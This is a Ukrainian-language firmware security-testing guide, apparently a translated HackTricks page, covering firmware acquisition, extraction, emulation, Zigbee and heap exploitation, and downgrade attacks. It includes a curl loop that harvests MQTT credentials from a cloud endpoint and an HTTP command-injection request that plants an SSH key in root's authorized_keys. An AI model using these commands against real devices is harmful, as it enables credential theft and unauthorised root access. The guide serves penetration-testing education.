Прошивка — це важливе програмне забезпечення, яке забезпечує належну роботу пристроїв, керуючи зв’язком між апаратними компонентами та програмним забезпеченням, з яким взаємодіють користувачі. Вона зберігається в постійній пам’яті, тож пристрій може отримати доступ до важливих інструкцій одразу після ввімкнення, що зрештою запускає операційну систему. Аналіз і потенційна модифікація прошивки — критично важливий крок для виявлення вразливостей безпеки.<sup>[[2]](#references)[[3]](#references)</sup>

## **Збір інформації**

**Збір інформації** — важливий початковий крок для розуміння будови пристрою та використовуваних ним технологій. Цей процес передбачає збір даних про:

- Архітектуру CPU та операційну систему, на якій він працює
- Особливості bootloader
- Компонування апаратного забезпечення та datasheets
- Метрики кодової бази та розташування вихідного коду
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень і регуляторні сертифікати
- Архітектурні діаграми та діаграми потоків
- Оцінки безпеки та виявлені вразливості

Для цього незамінними є інструменти **open-source intelligence (OSINT)**, а також аналіз доступних компонентів open-source software за допомогою ручної та автоматизованої перевірки. Такі інструменти, як [Coverity Scan](https://scan.coverity.com) і [Semmle’s LGTM](https://lgtm.com/#explore), надають безкоштовний статичний аналіз, який можна використовувати для пошуку потенційних проблем.

## **Отримання прошивки**

Прошивку можна отримати різними способами, кожен із яких має свій рівень складності:

- **Безпосередньо** з джерела (розробників, виробників)
- **Зібравши** її за наданими інструкціями
- **Завантаживши** з офіційних сайтів підтримки
- Використовуючи запити **Google dork** для пошуку розміщених файлів прошивки
- Отримавши прямий доступ до **cloud storage** за допомогою таких інструментів, як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехопивши **оновлення** за допомогою man-in-the-middle технік
- **Витягнувши** її з пристрою через з’єднання на кшталт **UART**, **JTAG** або **PICit**
- **Перехопивши** запити на оновлення в обміні даними пристрою
- Виявивши та використавши **жорстко закодовані кінцеві точки оновлення**
- **Знявши дамп** із bootloader або мережі
- **Знявши та зчитавши** чип пам’яті відповідними апаратними інструментами, якщо нічого іншого не допомогло

### Лише журнали UART: примусово запустити root shell через середовище U-Boot у flash

Якщо дані UART RX ігноруються (доступні лише журнали), усе одно можна примусово запустити shell init, **відредагувавши blob середовища U-Boot офлайн**:<sup>[[6]](#references)</sup>

1. Зніміть дамп SPI flash за допомогою кліпси SOIC-8 і програматора (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Знайдіть розділ env U-Boot, відредагуйте `bootargs`, додавши `init=/bin/sh`, і **перерахуйте CRC32 env U-Boot** для blob.
3. Перепрошийте лише розділ env і перезавантажте пристрій; у UART має з’явитися shell.

Це корисно для вбудованих пристроїв, де shell завантажувача вимкнено, але до розділу env можна записувати через зовнішній доступ до flash-пам’яті.

## Аналіз прошивки

Тепер, коли у вас **є прошивка**, потрібно витягти з неї інформацію, щоб знати, як із нею працювати. Для цього можна скористатися різними інструментами:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Якщо за допомогою цих інструментів не вдається багато чого знайти, перевірте **entropy** образу за допомогою `binwalk -E <bin>`. Якщо entropy низька, імовірно, образ не зашифрований. Якщо entropy висока, він, імовірно, зашифрований (або певним чином стиснений).

Крім того, за допомогою цих інструментів можна витягти **файли, вбудовані у firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Або скористайтеся [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), щоб перевірити файл.

### Отримання файлової системи

За допомогою згаданих вище інструментів, наприклад `binwalk -ev <bin>`, ви мали б змогти **витягти файлову систему**.\
Зазвичай Binwalk витягує її у **папку з назвою типу файлової системи**. Зазвичай це один із таких типів: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне отримання файлової системи

Іноді Binwalk **не має сигнатури з magic byte файлової системи**. У таких випадках скористайтеся Binwalk, щоб **знайти зміщення файлової системи, вирізати стиснену файлову систему** з бінарного файлу та **вручну витягти** її відповідно до типу, виконавши наведені нижче кроки.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Виконайте наведену нижче **команду dd**, щоб вилучити файлову систему Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Також можна виконати таку команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується у прикладі вище)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у каталозі "`squashfs-root`".

- Файли архівів CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs із NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Аналіз firmware

Після отримання firmware важливо проаналізувати його структуру та потенційні вразливості. Для цього використовують різні інструменти, щоб проаналізувати й витягти цінні дані з образу firmware.

### Інструменти початкового аналізу

Нижче наведено набір команд для первинної перевірки бінарного файла (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, витягти рядки, проаналізувати бінарні дані та зрозуміти структуру розділів і файлової системи:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Щоб оцінити стан шифрування образу, перевіряють його **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія свідчить про відсутність шифрування, а висока може вказувати на шифрування або стиснення.

Для вилучення **вбудованих файлів** рекомендуються такі інструменти й ресурси, як документація **file-data-carving-recovery-tools** і **binvis.io** для перевірки файлів.

### Вилучення файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна вилучити файлову систему — часто до каталогу, названого відповідно до її типу (наприклад, squashfs, ubifs). Однак якщо **binwalk** не може розпізнати тип файлової системи через відсутність magic bytes, її потрібно вилучити вручну. Для цього за допомогою `binwalk` знаходять зсув файлової системи, а потім командою `dd` вирізають її:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Згодом, залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs), для ручного вилучення вмісту використовують різні команди.

### Аналіз файлової системи

Після вилучення файлової системи починається пошук вразливостей. Перевіряють незахищені мережеві демони, жорстко закодовані облікові дані, кінцеві точки API, функції сервера оновлень, нескомпільований код, сценарії запуску та скомпільовані бінарні файли для офлайн-аналізу.

**Основні розташування** та **елементи** для перевірки:

- **etc/shadow** і **etc/passwd** — облікові дані користувачів
- SSL-сертифікати й ключі в **etc/ssl**
- Файли конфігурації та сценарії, які можуть містити вразливості
- Вбудовані бінарні файли для подальшого аналізу
- Поширені вебсервери й бінарні файли пристроїв IoT

У виявленні конфіденційної інформації та вразливостей у файловій системі допомагають кілька інструментів:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) для пошуку конфіденційної інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для комплексного аналізу firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) і [**EMBA**](https://github.com/e-m-b-a/emba) для статичного й динамічного аналізу

### Перевірка скомпільованих бінарних файлів на вразливості

Вихідний код і скомпільовані бінарні файли, знайдені у файловій системі, потрібно перевірити на вразливості. Такі інструменти, як **checksec.sh** для бінарних файлів Unix і **PESecurity** для бінарних файлів Windows, допомагають виявити незахищені бінарні файли, які можна експлуатувати.

## Отримання конфігурації cloud і облікових даних MQTT за допомогою похідних URL-токенів

Багато IoT-хабів отримують конфігурацію для кожного пристрою з кінцевої точки cloud такого вигляду:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Під час аналізу firmware можна виявити, що `<token>` локально генерується на основі ідентифікатора пристрою з використанням жорстко закодованого секрету, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і представлений у вигляді шістнадцяткового рядка у верхньому регістрі

Така схема дає змогу будь-кому, хто дізнається deviceId і STATIC_KEY, відтворити URL і отримати конфігурацію cloud, у якій часто містяться облікові дані MQTT у відкритому тексті та префікси topic.

Практичний порядок дій:

1) Витягніть deviceId з журналів завантаження UART

- Під’єднайте адаптер UART на 3,3 В (TX/RX/GND) і збережіть журнали:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Шукайте рядки, що виводять шаблон URL хмарної конфігурації та адресу брокера, наприклад:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Відновіть STATIC_KEY і алгоритм токена з firmware

- Завантажте бінарні файли в Ghidra/radare2 і знайдіть шлях конфігурації ("/pf/") або використання MD5.
- Підтвердьте алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Обчисліть токен у Bash і переведіть хеш у верхній регістр:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Зберіть конфігурацію хмари та облікові дані MQTT

- Сформуйте URL і отримайте JSON за допомогою curl; проаналізуйте його за допомогою jq, щоб отримати секрети:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Використання незашифрованого MQTT і слабких ACL для топіків (якщо є)

- Використовуйте відновлені облікові дані, щоб підписатися на топіки обслуговування та шукати конфіденційні події:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Перелічіть передбачувані ідентифікатори пристроїв (масштабно, з дозволом)

- У багатьох екосистемах використовуються байти OUI/продукту/типу виробника, за якими йде послідовний суфікс.
- Можна перебирати можливі ID, програмно генерувати токени та отримувати конфігурації:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Примітки
- Завжди отримуйте явний дозвіл перед спробами масового перебирання.
- За можливості надавайте перевагу емуляції або статичному аналізу для отримання секретів без модифікації цільового обладнання.


Процес емуляції firmware дає змогу проводити **динамічний аналіз** роботи пристрою або окремої програми. Такий підхід може ускладнюватися залежностями від обладнання чи архітектури, але перенесення кореневої файлової системи або певних бінарних файлів на пристрій із відповідною архітектурою та порядком байтів, наприклад Raspberry Pi, або на попередньо зібрану віртуальну машину може полегшити подальше тестування.

### Емуляція окремих бінарних файлів

Для дослідження окремих програм важливо визначити порядок байтів і архітектуру процесора програми.

#### Приклад з архітектурою MIPS

Для емуляції бінарного файлу для архітектури MIPS можна скористатися командою:

```bash
file ./squashfs-root/bin/busybox
```

А щоб встановити необхідні інструменти емуляції:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Для MIPS (big-endian) використовується `qemu-mips`, а для бінарних файлів із little-endian підійде `qemu-mipsel`.

#### Емуляція архітектури ARM

Для бінарних файлів ARM процес аналогічний: для емуляції використовується емулятор `qemu-arm`.

### Повна емуляція системи

Такі інструменти, як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші, забезпечують повну емуляцію firmware, автоматизуючи процес і полегшуючи динамічний аналіз.

### Відновлення розділених і перевірених root-файлових систем для емуляції

Якщо superblock SquashFS читається, але зсуви inode, каталогів або таблиці фрагментів неможливі, не виправляйте `unsquashfs` одразу. Виконайте reverse engineering бінарного файлу раннього завантаження й відтворіть граф блокових пристроїв, який він створює: вбудовані системи можуть мати номінальний root-розділ, але будувати справжню файлову систему за допомогою зіставлення `dm-linear`, що додає сектори з іншого розділу. Перевірки лише superblock можуть пройти успішно, навіть якщо всі наступні блоки метаданих зміщені.<sup>[[9]](#references)</sup>

Точно відтворюйте арифметичні операції firmware. Зокрема, з’ясуйте, чи довжини вказано в байтах, секторах по 512 байтів чи сторінках по 4 KiB; відтворіть зсуви бітів і усічення в початковому порядку; врахуйте залежні від банку кінцеві ділянки в конфігураціях A/B. Наприклад, `(partition_bytes >> 12) << 3` спочатку округлює значення до межі 4 KiB, а потім виражає результат у секторах по 512 байтів; заміна на `partition_bytes // 512` може змістити додану область на кілька кілобайтів і пошкодити всі наступні таблиці SquashFS.<sup>[[9]](#references)</sup>

Корисний процес перевірки:<sup>[[9]](#references)</sup>

1. Відновіть із бінарного файлу verifier/init вихідний пристрій, початковий сектор і довжину кожного сегмента `dm-linear`.
2. Об’єднайте області або зіставте їх, не змінюючи правила вирівнювання.
3. Якщо витягування все ще не вдається, виконайте пошук лише в невеликому діапазоні навколо прогнозованої межі й вимагайте наявності кількох послідовних коректних структур метаданих, а не покладайтеся лише на правдоподібний superblock.
4. Запустіть незмінений `unsquashfs` для відновленого образу; успішний обхід усіх каталогів і фрагментів є переконливішим доказом, ніж `unsquashfs -stat`.

#### Заміна dm-verity під контролем аналітика

Якщо аналітик контролює ядро QEMU, initramfs і віртуальні диски, змінену root-файлову систему можна завантажити, замінивши PID 1 виробника, який виконує перевірку, на невеликий статично скомпонований init. Це **підміна ланцюжка завантаження в лабораторному середовищі**, а не злам dm-verity, його підпису RSA, Secure Boot чи ключа, запечатаного TPM.<sup>[[9]](#references)</sup>

Замінний init має відтворювати операційні етапи початкового процесу завантаження: змонтувати `devtmpfs`, викликати `setsid()`, під’єднати `/dev/console` до файлових дескрипторів 0–2, змонтувати `/proc` і `/sys`, дочекатися наданого блокового пристрою, змонтувати відредаговану root-файлову систему лише для читання, від’єднати псевдофайлові системи старої root-файлової системи, перемістити нове монтування в `/` за допомогою `MS_MOVE`, виконати `chroot` і `execve()` для оригінального `/sbin/init` у firmware. Від’єднання `/dev`, `/proc` і `/sys` **до** `MS_MOVE` запобігає випадковому від’єднанню точок монтування, що належать новій root-файловій системі.<sup>[[9]](#references)</sup>

Зберігайте змінюваний стан пристрою окремо від зміненої незмінної root-файлової системи. Оверлей qcow2 може зберегти стан LVM оригінального диска, тоді як другий virtio-диск лише для читання надає відредагований SquashFS:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Налагодження стану образу офлайн

Перевіряйте постійний стан поза гостьовою системою, якщо повільне завантаження, руйнівні сценарії запуску або ненадійне журналювання консолі ускладнюють пошук причини збою. Ніколи не підключайте overlay, який використовує запущена VM; експонуйте його за допомогою `qemu-nbd`, обмежте виявлення LVM потрібним розділом NBD і деактивуйте групу томів перед від’єднанням.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Для відтворюваної ізоляції збоїв записуйте файли-маркери з часовими позначками на стабільний том із правом запису та перевіряйте їх офлайн; `/dev/kmsg`, FIFO та тимчасові консолі можуть давати хибнонегативні результати через обмеження частоти запису або передчасне завершення процесу. Також порівнюйте точні інтерфейси між рівнями, перш ніж змінювати не пов’язаний із проблемою код: `uname -r` і `/lib/modules/`, функції ext4 на диску та конфігурацію ядра, а також покоління Mesa `libGL`, ABI драйвера DRI та назви драйверів, визначені за PCI. Компонент може існувати й навіть успішно завантажуватися через `dlopen()`, але залишатися непридатним до використання, бо його споживач очікує інший ABI.<sup>[[9]](#references)</sup>

## Динамічний аналіз на практиці

На цьому етапі для аналізу використовують реальне або емульоване середовище пристрою. Важливо зберігати доступ до оболонки ОС і файлової системи. Емуляція може не точно відтворювати взаємодію з обладнанням, тож іноді потрібно перезапускати емуляцію. Під час аналізу слід знову дослідити файлову систему, експлуатувати доступні вебсторінки й мережеві служби та шукати вразливості завантажувача. Перевірки цілісності прошивки мають вирішальне значення для виявлення потенційних вразливостей, пов’язаних із бекдорами.

## Техніки аналізу під час виконання

Аналіз під час виконання передбачає взаємодію з процесом або бінарним файлом у його робочому середовищі за допомогою таких інструментів, як gdb-multiarch, Frida та Ghidra, для встановлення точок зупинки й виявлення вразливостей за допомогою fuzzing та інших технік.

Для вбудованих цілей без повноцінного налагоджувача **скопіюйте на пристрій статично скомпонований `gdbserver` і під’єднайтеся до нього віддалено**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Відображення повідомлень Zigbee / радіоспівпроцесора

У IoT-хабах стек RF часто розподілений між **радіо-MCU** та процесом Linux userland. Корисний робочий процес — відобразити шлях:<sup>[[8]](#references)</sup>

1. **RF-кадр** в ефірі
2. **Парсер на боці контролера** на радіо-MCU
3. **Текстовий або TLV-протокол через послідовний порт/UART**, що передається до Linux (наприклад, `/dev/tty*`)
4. **Диспетчер застосунку** в основному daemon
5. **Обробник, специфічний для протоколу / кінцевий автомат**

Ця архітектура створює дві цілі для реверсингу замість однієї. Якщо контролер перетворює двійкові радіокадри на текстовий протокол на кшталт `Group,Command,arg1,arg2,...`, з’ясуйте:

- **Групи повідомлень** і таблиці диспетчеризації
- Які повідомлення можуть надходити з **мережі**, а які — від самого контролера
- Точні **поля-дискримінатори, специфічні для виробника** (наприклад, Zigbee `manufacturer_code` і власний `cluster_command`)
- Які обробники доступні лише під час **введення в мережу**, виявлення або завантаження прошивки/моделі

Щодо Zigbee, перехопіть трафік сполучення та перевірте, чи ціль усе ще використовує стандартний **Link Key** `ZigBeeAlliance09`. Якщо так, перехоплення трафіку введення в мережу може розкрити **Network Key**. Коди встановлення Zigbee 3.0 зменшують цей ризик, тож зафіксуйте, чи тестований пристрій справді вимагає їх використання.

### Обробники протоколів виробника та доступність, обмежена FSM

Специфічні для виробника команди Zigbee/ZCL часто є кращою ціллю, ніж стандартизовані кластери, оскільки вони передають керування **власному коду парсингу** та внутрішнім **FSM**, перевірки яких пройшли менше випробувань.<sup>[[8]](#references)</sup>

Практичний робочий процес:

- Реверсуйте диспетчер команд, доки не знайдете **обробник лише для команд виробника**.
- Відновіть таблиці **станів FSM**, **подій**, **перевірок**, **дій** і **наступних станів**.
- Визначте **перехідні стани**, які автоматично просуваються далі, а також гілки повторних спроб/помилок, що зрештою скидають або звільняють контрольовані атакувальником дані.
- З’ясуйте, які легітимні обміни за протоколом потрібні, щоб перевести daemon у вразливий стан, замість того щоб припускати, ніби до вразливого обробника завжди можна дістатися.

Для протоколів, чутливих до часу, повторне відтворення пакетів із Python-фреймворку може бути надто повільним. Надійніший підхід — емулювати легітимний пристрій на реальному обладнанні (наприклад, **nRF52840**) із використанням стека виробничого рівня, щоб можна було відкрити потрібні **кінцеві точки**, **атрибути** та витримати правильний час введення в мережу.

### Клас помилок у завантаженнях фрагментованих даних у вбудованих daemon

У **фрагментованих завантаженнях blob/моделей/конфігурацій** регулярно трапляється такий клас помилок прошивки:<sup>[[8]](#references)</sup>

1. **Перший фрагмент** (`offset == 0`) записує `ctx->total_size` і виділяє пам’ять через `malloc(total_size)`.
2. Наступні фрагменти перевіряють лише контрольовані атакувальником **локальні для пакета** поля, наприклад `packet_total_size >= offset + chunk_len`.
3. Копіювання виконується через `memcpy(&ctx->buffer[offset], chunk, chunk_len)` без перевірки відповідності **початковому розміру виділеної пам’яті**.

Це дає змогу атакувальнику надіслати:

- Перший коректний фрагмент із **малим** заявленим загальним розміром, щоб примусово виділити невеликий блок у heap.
- Пізніший фрагмент із **очікуваним offset**, але більшим `chunk_len`.
- Підроблений локальний розмір пакета, що проходить повторні перевірки, але все одно спричиняє переповнення початково виділеного буфера.

Якщо вразливий шлях захищений логікою введення в мережу, для експлуатації потрібно достатньо **емуляції пристрою**, щоб перевести ціль у потрібний стан завантаження моделі чи blob перед надсиланням некоректних фрагментів.

### Протокольні тригери `free()`

У вбудованих daemon найпростіший спосіб запустити експлуатацію метаданих heap — часто не «чекати на очищення», а **викликати власну обробку помилок протоколу**:<sup>[[8]](#references)</sup>

- Надсилайте некоректні наступні фрагменти, щоб перевести FSM у стани **повторної спроби** чи **помилки**.
- Перевищте поріг повторних спроб, щоб daemon **скинув контекст** і звільнив пошкоджений буфер.
- Використайте це передбачуване викликання `free()`, щоб запустити примітиви на боці алокатора, перш ніж процес аварійно завершиться з інших причин.

Це особливо корисно проти алокаторів на кшталт **musl/uClibc/dlmalloc** у вбудованому Linux, де пошкодження метаданих чанка може перетворити логіку unlink/unbin на примітив запису. Стабільний підхід — пошкодити **поле розміру**, щоб спрямувати обхід алокатора на **підроблені чанки, розміщені всередині переповненого буфера**, замість того щоб одразу пошкодити справжні вказівники bin і аварійно завершити процес.

## Бінарна експлуатація та Proof-of-Concept

Розробка PoC для виявлених вразливостей потребує глибокого розуміння архітектури цілі та програмування мовами нижчого рівня. Захисти під час виконання бінарних файлів у вбудованих системах трапляються рідко, але за їх наявності можуть знадобитися такі техніки, як Return Oriented Programming (ROP).

### Нотатки щодо експлуатації fastbin у uClibc (вбудований Linux)

- **Fastbins + об’єднання:** uClibc використовує fastbins, подібні до glibc. Пізніше велике виділення пам’яті може спричинити виклик `__malloc_consolidate()`, тому будь-який підроблений чанк має пройти перевірки (коректний розмір, `fd = 0`, а навколишні чанки мають вважатися «зайнятими»).<sup>[[6]](#references)</sup>
- **Бінарні файли без PIE під ASLR:** якщо ASLR увімкнено, але основний бінарний файл **не PIE**, адреси `.data/.bss` усередині бінарного файла стабільні. Можна вибрати ділянку, яка вже схожа на коректний заголовок чанка heap, щоб спрямувати виділення fastbin на **таблицю вказівників на функції**.
- **NUL, що зупиняє парсер:** під час парсингу JSON символ `\x00` у корисному навантаженні може зупинити парсинг, зберігши наступні контрольовані атакувальником байти для pivot на стеку/ланцюжка ROP.
- **Shellcode через `/proc/self/mem`:** ланцюжок ROP, який викликає `open("/proc/self/mem")`, `lseek()` і `write()`, може розмістити виконуваний shellcode у відомому відображенні пам’яті й передати на нього керування.

## Атаки зі зниженням версії прошивки та незахищені механізми оновлення

Навіть коли виробник реалізує криптографічну перевірку підписів образів прошивки, **захист від відкату версії (downgrade) часто відсутній**. Якщо завантажувач або завантажувач відновлення перевіряє лише підпис за допомогою вбудованого відкритого ключа, але не порівнює *версію* (або монотонний лічильник) образу, що записується, атакувальник може легітимно встановити **старішу вразливу прошивку з дійсним підписом** і таким чином повторно зробити доступними виправлені вразливості.<sup>[[4]](#references)</sup>

Типовий робочий процес атаки:

1. **Отримайте старіший підписаний образ**
   * Завантажте його з публічного порталу завантажень виробника, CDN або сайту підтримки.
   * Витягніть його з супутніх мобільних/настільних застосунків (наприклад, із `assets/firmware/` усередині Android APK).
   * Знайдіть його у сторонніх репозиторіях, таких як VirusTotal, інтернет-архівах, на форумах тощо.
2. **Завантажте образ на пристрій або надайте його пристрою** через будь-який доступний канал оновлення:
   * Web UI, API мобільного застосунку, USB, TFTP, MQTT тощо.
   * Багато споживчих IoT-пристроїв мають *неавтентифіковані* кінцеві точки HTTP(S), які приймають Base64-кодовані blob прошивки, декодують їх на сервері та запускають відновлення/оновлення.
3. Після відкату скористайтеся вразливістю, яку виправили в новішому випуску (наприклад, фільтром для command injection, доданим пізніше).
4. За бажанням поверніть найновіший образ або вимкніть оновлення, щоб не привертати уваги після отримання закріплення.

### Приклад: Command Injection після відкату

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

У вразливій (пониженій до старішої версії) прошивці параметр `md5` напряму конкатенується з командою оболонки без очищення, що дає змогу впроваджувати довільні команди (у цьому випадку — увімкнути root-доступ через SSH за ключем). У пізніших версіях прошивки додали базовий фільтр символів, але відсутність захисту від відкату зводить нанівець це виправлення.<sup>[[4]](#references)</sup>

### Витягування прошивки з мобільних застосунків

Багато виробників додають повні образи прошивки до супутніх мобільних застосунків, щоб застосунок міг оновлювати пристрій через Bluetooth/Wi-Fi. Ці пакунки зазвичай зберігаються в APK/APEX без шифрування, за шляхами на кшталт `assets/fw/` або `res/raw/`. Такі інструменти, як `apktool`, `ghidra` або навіть звичайний `unzip`, дають змогу отримати підписані образи, не торкаючись фізичного обладнання.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Обхід anti-rollback лише на рівні updater у схемах зі слотами A/B

Деякі виробники реалізують **ratchet** для захисту від downgrade, але лише в логіці *updater* (наприклад, у процедурі UDS через CAN, команді відновлення або OTA-агенті в userspace). Якщо **bootloader** згодом перевіряє лише підпис/CRC образу та довіряє таблиці розділів або метаданим слотів, захист від rollback усе одно можна обійти.<sup>[[7]](#references)</sup>

Типова слабка схема:

- Метадані firmware містять і дескриптор версії, і **security ratchet** / монотонний лічильник.
- Updater порівнює ratchet образу зі значенням у постійному сховищі та відхиляє старіші підписані образи.
- **Bootloader** не розбирає цей ratchet і перед запуском вибраного слота перевіряє лише заголовок, CRC та підпис.
- Активація слота зберігається окремо в таблиці розділів або лічильнику поколінь для кожного слота й **не прив’язана криптографічно** до точного хешу перевіреної firmware.

У системах із двома слотами це створює примітив **«перевірити один образ / завантажити інший»**. Якщо зловмисник може змусити updater позначити слот B як ціль для наступного завантаження за допомогою актуального підписаного образу, а потім перезаписати слот B до перезавантаження, bootloader усе ще може завантажити застарілий образ, оскільки довіряє лише вже збереженим метаданим слота.

Типовий шаблон зловживання:

1. Завантажити **актуальну підписану** firmware у пасивний слот і запустити звичайну процедуру перевірки/перемикання, щоб розкладка позначила цей слот як наступний активний.
2. **Поки що не перезавантажувати пристрій**. У тій самій сесії знову запустити процедуру підготовки/стирання слота.
3. Скористатися застарілим станом завантаження або логікою вибору слота, щоб updater стер **той самий фізичний слот**, який щойно було активовано.
4. Записати в цей слот **старішу, але все ще підписану** firmware.
5. Пропустити процедуру перевірки, яка застосовує ratchet, і перезавантажити пристрій напряму.
6. Bootloader вибирає активований слот, перевіряє лише підпис/цілісність і завантажує старий образ.

На що звертати увагу під час аналізу реалізацій оновлення A/B:

- Вибір слота на основі **прапорців часу завантаження**, які не оновлюються після успішного перемикання.
- Процедура на кшталт `prepare_passive_slot()`, яка стирає слот на основі застарілого стану, а не **поточної зафіксованої розкладки**.
- Функція на кшталт `part_write_layout()`, яка лише збільшує **лічильник поколінь** / встановлює прапорець активності, але не зберігає хеш перевіреного образу.
- Перевірки ratchet реалізовані в userspace або коді updater, але **не** в ROM / bootloader / етапах secure boot.
- Процедури стирання або відновлення, які залишають слот позначеним як завантажуваний навіть після видалення та перезапису його вмісту.

### Контрольний список для оцінювання логіки оновлення

* Чи належно захищено транспорт/автентифікацію *endpoint оновлення* (TLS + автентифікація)?
* Чи порівнює пристрій **номери версій** або **монотонний лічильник anti-rollback** перед прошиванням?
* Чи перевіряється образ у межах ланцюжка secure boot (наприклад, чи перевіряє ROM-код підписи)?
* Чи застосовує **bootloader той самий ratchet**, що й updater, замість того, щоб перевіряти лише підпис/CRC?
* Чи **прив’язані метадані активації слота до перевіреного digest/версії firmware**, чи слот можна змінити після активації?
* Після успішного перемикання слота пристрій примусово перезавантажується чи в тій самій сесії залишаються доступними наступні процедури оновлення/стирання?
* Чи виконує код userland додаткові перевірки коректності (наприклад, дозволеної карти розділів, номера моделі)?
* Чи використовують *часткові* або *резервні* сценарії оновлення ту саму логіку перевірки?

> 💡  Якщо чогось із переліченого бракує, платформа, імовірно, вразлива до rollback-атак.

## Відновлення ключів розшифрування firmware зі стану вбудованих KMS/Vault

